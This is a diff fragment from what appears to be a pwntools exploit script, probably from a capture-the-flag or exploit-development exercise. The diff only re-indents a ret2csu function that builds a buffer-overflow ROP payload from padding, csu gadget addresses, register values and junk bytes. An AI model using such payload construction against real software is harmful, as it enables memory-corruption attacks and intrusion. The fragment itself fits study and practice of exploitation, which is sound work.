@@ -44,11 +44,11 @@ context.log_level = 'info'
 
 def ret2csu(rbx, rbp, r12, r13, r14, r15, ret):
 	payload = flat([
-	b'A' * offset,
-	csu1, rbx, rbp, r12, r13, r14, r15,
-	csu2,
-	b'0' * 56, # JUNK to reach the return address
-	ret
+		b'A' * offset,
+		csu1, rbx, rbp, r12, r13, r14, r15,
+		csu2,
+		b'0' * 56, # JUNK to reach the return address
+		ret
 	])
 	return payload
 
